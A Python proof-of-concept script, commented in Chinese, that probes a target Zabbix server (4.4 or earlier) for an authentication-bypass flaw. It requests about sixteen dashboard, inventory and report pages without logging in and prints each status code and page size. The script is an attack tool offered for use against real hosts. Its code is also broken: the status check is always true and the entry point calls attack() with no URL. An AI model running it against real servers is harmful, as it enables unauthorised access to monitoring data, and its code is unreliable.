# -*- coding: utf-8 -*-
import requests

'''
Usage:
    moon.py -u  zabbix http://127.0.0.1:8080
    相关链接：https://cxsecurity.com/issue/WLB-2019100030
    这个漏洞的话，姑且看看吧。测试的时候手里环境不是很全，可能有问题，上面原始脚本是perl的，可以试一下
    影响范围：Zabbix <= 4.4
    The target is vulnerable. Try to open these links:
    https://TARGET/zabbix/zabbix.php?action=dashboard.view
    https://TARGET/zabbix/zabbix.php?action=dashboard.view&ddreset=1
    https://TARGET/zabbix/zabbix.php?action=problem.view&ddreset=1
    https://TARGET/zabbix/overview.php?ddreset=1
    https://TARGET/zabbix/zabbix.php?action=web.view&ddreset=1
    https://TARGET/zabbix/latest.php?ddreset=1
    https://TARGET/zabbix/charts.php?ddreset=1
    https://TARGET/zabbix/screens.php?ddreset=1
    https://TARGET/zabbix/zabbix.php?action=map.view&ddreset=1
    https://TARGET/zabbix/srv_status.php?ddreset=1
    https://TARGET/zabbix/hostinventoriesoverview.php?ddreset=1
    https://TARGET/zabbix/hostinventories.php?ddreset=1
    https://TARGET/zabbix/report2.php?ddreset=1
    https://TARGET/zabbix/toptriggers.php?ddreset=1
    https://TARGET/zabbix/zabbix.php?action=dashboard.list
    https://TARGET/zabbix/zabbix.php?action=dashboard.view&dashboardid=1
'''

def attack(URL):
    urls = (
        '/zabbix.php?action=dashboard.view',
        '/zabbix.php?action=dashboard.view&ddreset=1',
        '/zabbix.php?action=problem.view&ddreset=1',
        '/overview.php?ddreset=1',
        '/zabbix.php?action=web.view&ddreset=1',
        '/latest.php?ddreset=1',
        '/charts.php?ddreset=1',
        '/screens.php?ddreset=1',
        '/zabbix.php?action=map.view&ddreset=1',
        '/srv_status.php?ddreset=1',
        '/hostinventoriesoverview.php?ddreset=1',
        '/hostinventories.php?ddreset=1',
        '/report2.php?ddreset=1',
        '/toptriggers.php?ddreset=1',
        '/zabbix.php?action=dashboard.list',
        '/zabbix.php?action=dashboard.view&dashboardid=1'
    )

    print('[+]开始检测- Zabbix 4.2 - Authentication Bypass。[+]')
    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    headers={"User-Agent":user_agent}
    for url in urls:
        url = URL + url
        try:
            verify_response = requests.get(url, headers=headers)

            if verify_response.status_code == 200 or 304 or 401:
                try:
                    print('页面返回状态码：'+str(verify_response.status_code)+'  '+'页面返回大小为：'+str(len(verify_response.text))+'  '+url) # 因为部分网站设置了统一的404页面，造成误报，因此添加返回长度来进行辅助判断
                except Exception:
                    pass
            else:
                continue
        except Exception:
            print("Someerror!")
    print('[+]检测结束-Zabbix 4.2 - Authentication Bypass。[+]')
    print('\n')

if __name__ == "__main__":
    attack()
